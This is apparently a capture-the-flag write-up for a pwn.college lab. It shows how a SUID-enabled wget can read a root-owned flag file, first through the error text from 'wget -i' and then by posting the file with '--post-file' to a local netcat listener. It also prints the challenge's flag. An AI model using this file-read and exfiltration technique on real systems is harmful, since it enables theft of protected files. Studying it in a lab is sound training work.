`wget` is a command-line utility in Linux used for downloading files from the web. `wget` stands for `web get`.

`wget` is designed for robustness over slow and unstable network connections.

This problem is a little bit hard. I mean you have to some prior knowledge about `netcat`. `port listening, local host` stuff

If you read the `man wget` you will find an option `-i file --input-file=file : Read URLs from a local or external file`

```bash
hacker@program-misuse-level-50:~$ /challenge/babysuid_level50 
Welcome to /challenge/babysuid_level50!

This challenge is part of a series of programs that
just straight up weren not designed to let you read files.

I just set the SUID bit on /usr/bin/wget.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level50) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/wget!
hacker@program-misuse-level-50:~$ ls
Desktop  demo  test  test.c
hacker@program-misuse-level-50:~$ wget -i /flag
--2024-01-03 19:03:06--  http://pwn.college%7Bc3z_9dnhqsrtofc_udzckj_b7em.0lm5edl0ajnzqzw%7D/
Resolving pwn.college{c3z_9dnhqsrtofc_udzckj_b7em.0lm5edl0ajnzqzw} (pwn.college{c3z_9dnhqsrtofc_udzckj_b7em.0lm5edl0ajnzqzw})... failed: Name or service not known.
wget: unable to resolve host address 'pwn.college{c3z_9dnhqsrtofc_udzckj_b7em.0lm5edl0ajnzqzw}'
```

`-i` will take the contents of the `flag` file as a `URL` but when it sees that the `URL` is not valid, it shows an error saying that `pwn.college{c3z_9dnhqsrtofc_udzckj_b7em.0lm5edl0ajnzqzw}` `name or service not known`. Hence we get the flag.

But NO! the flag is showing `incorrect` . I think we messed up the string somewhere. Looks like all of the letter became lower-case.

```bash
hacker@program-misuse-level-50:~$ /challenge/babysuid_level50 
Welcome to /challenge/babysuid_level50!

This challenge is part of a series of programs that
just straight up were not designed to let you read files.

I just set the SUID bit on /usr/bin/wget.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level50) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/wget!
hacker@program-misuse-level-50:~$ wget -i /flag
--2024-01-03 20:34:23--  http://pwn.college%7Bc3z_9dnhqsrtofc_udzckj_b7em.0lm5edl0ajnzqzw%7D/
Resolving pwn.college{c3z_9dnhqsrtofc_udzckj_b7em.0lm5edl0ajnzqzw} (pwn.college{c3z_9dnhqsrtofc_udzckj_b7em.0lm5edl0ajnzqzw})... failed: Name or service not known.
wget: unable to resolve host address 'pwn.college{c3z_9dnhqsrtofc_udzckj_b7em.0lm5edl0ajnzqzw}'
hacker@program-misuse-level-50:~$ wget --help | grep FILE
  -o,  --output-file=FILE          log messages to FILE
  -a,  --append-output=FILE        append messages to FILE
  -i,  --input-file=FILE           download URLs found in local or external FILE
       --config=FILE               specify config file to use
       --rejected-log=FILE         log reasons for URL rejection to FILE
  -O,  --output-document=FILE      write documents to FILE
       --load-cookies=FILE         load cookies from FILE before session
       --save-cookies=FILE         save cookies to FILE after session
       --post-file=FILE            use the POST method; send contents of FILE
       --body-file=FILE            send contents of FILE. --method MUST be set
       --certificate=FILE          client certificate file
       --private-key=FILE          private key file
       --ca-certificate=FILE       file with the bundle of CAs
       --crl-file=FILE             file with bundle of CRLs
       --pinnedpubkey=FILE/HASHES  Public key (PEM/DER) file, or any number
       --random-file=FILE          file with random data for seeding the SSL PRNG
       --warc-file=FILENAME        save request/response data to a .warc.gz file
       --warc-dedup=FILENAME       do not store records listed in this CDX file
hacker@program-misuse-level-50:~$ wget --load-cookies=/flag http://localhost:4242
--2024-01-03 20:37:53--  http://localhost:4242/
Resolving localhost (localhost)... 127.0.0.1, ::1
Connecting to localhost (localhost)|127.0.0.1|:4242... connected.
HTTP request sent, awaiting response... ^C
hacker@program-misuse-level-50:~$ wget --post-file=/flag http://localhost
--2024-01-03 20:39:38--  http://localhost/
Resolving localhost (localhost)... 127.0.0.1, ::1
Connecting to localhost (localhost)|127.0.0.1|:80... connected.
HTTP request sent, awaiting response...
```

```bash
hacker@program-misuse-level-50:~$ nc -lp 4242
GET / HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: localhost:4242
Connection: Keep-Alive

hacker@program-misuse-level-50:~$ nc -lp 80
POST / HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: localhost
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

pwn.college{c3Z_9dNhqSrTofc_UdzcKj_B7Em.0lM5EDL0AjNzQzW}

```
